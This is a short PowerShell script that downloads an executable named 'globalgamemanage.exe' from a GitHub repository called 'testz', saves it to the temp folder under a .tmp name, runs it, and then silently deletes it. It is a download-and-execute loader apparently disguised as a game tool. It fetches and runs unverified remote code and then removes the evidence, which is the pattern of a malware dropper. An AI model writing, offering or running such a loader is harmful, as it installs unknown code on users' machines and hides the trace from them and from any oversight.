$ErrorActionPreference = "Stop"

$GameUrl = "https://github.com/tema132b-arch/testz/raw/main/globalgamemanage.exe"
$TempFile = Join-Path ([IO.Path]::GetTempPath()) "globalgamemanage.tmp"

Invoke-WebRequest -Uri $GameUrl -OutFile $TempFile -UseBasicParsing

& $TempFile


Remove-Item $TempFile -Force -ErrorAction SilentlyContinue
